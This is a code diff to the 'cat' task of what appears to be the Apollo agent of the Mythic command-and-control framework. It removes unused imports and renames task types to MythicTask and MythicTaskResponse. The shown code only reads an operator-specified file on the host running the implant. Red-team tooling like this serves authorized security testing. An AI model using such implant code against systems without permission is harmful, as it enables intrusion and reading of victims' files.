@@ -6,18 +6,13 @@
 
 #if CAT
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 using ApolloInterop.Classes;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
-using ApolloInterop.Serializers;
 using System.Threading;
 using ApolloInterop.Classes.Collections;
 using System.IO;
-using System.Security.Principal;
 using TT = System.Threading.Tasks;
 namespace Tasks
 {
@@ -40,7 +35,7 @@ namespace Tasks
         private byte[] _buffer = new byte[_chunkSize];
         private long _bytesRemaining = 0;
 
-        public cat(IAgent agent, Task task) : base(agent, task)
+        public cat(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _timers = new WaitHandle[]
             {
@@ -66,7 +61,7 @@ namespace Tasks
         {
             if (!string.IsNullOrEmpty(msg))
             {
-                TaskResponse resp = CreateTaskResponse(
+                MythicTaskResponse resp = CreateTaskResponse(
                     msg,
                     false,
                     "");
@@ -101,7 +96,7 @@ namespace Tasks
 
         public override void Start()
         {
-            TaskResponse resp;
+            MythicTaskResponse resp;
             CatParameters parameters = _jsonSerializer.Deserialize<CatParameters>(_data.Parameters);
             if (!File.Exists(parameters.Path))
             {
